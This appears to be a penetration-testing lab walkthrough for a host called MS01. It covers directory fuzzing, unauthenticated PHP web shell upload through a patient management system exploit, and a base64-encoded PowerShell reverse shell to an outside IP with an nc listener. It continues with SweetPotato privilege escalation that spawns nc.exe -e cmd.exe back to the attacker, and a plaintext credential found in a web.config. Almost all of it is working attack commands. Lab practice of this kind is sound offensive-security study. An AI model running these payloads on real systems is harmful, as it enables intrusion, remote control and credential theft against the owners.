

## .101 (MS01)


```bash

# Fuzz for directories
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.124.101:/FUZZ

# Found login page at:
/webaccess

# Google Clinic's Patient Management System exploit


# Exploit used
https://www.exploit-db.com/exploits/51779

# Follow the instructions and upload a php web shell unauthenticated
## Unauthenticated users can access /pms/users.php address and they can upload malicious php file instead of profile picture image without any authentication.

# After successfull upload the web shell can be seen at:
http://192.168.124.101/webaccess/user_images/

# Execute command such as:
http://192.168.124.101/webaccess/user_images/1718804181simple-backdoor.phP?cmd=whoami

# Generate a reverse shell for PS (base64 encoded)
'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEAMgA0ACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='

# nc listener
nc -nvlp 1234

# Run exploit
GET /webaccess/user_images/1718804181simple-backdoor.phP?cmd=powershell+-e+JABjAGwAaQBlA..

# whoami
	ms01\a.hansen
	
# Run winpeas
mysql running 3307


# Check privs
whoami /all
	impersonate enabled
	
# Run sweetpotato
.\sweetpotato.exe -a "C:\users\a.hansen\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.49.124 1122"

# whoami

# Found creds in C:\Users\a.hansen\Documents\sys.zip
	web.config
		rudi.davis:SysAdmin4Life!
		
# Totaly stuck on lateral movement
# Do not find any place to utlilize the rudi.davis creds




```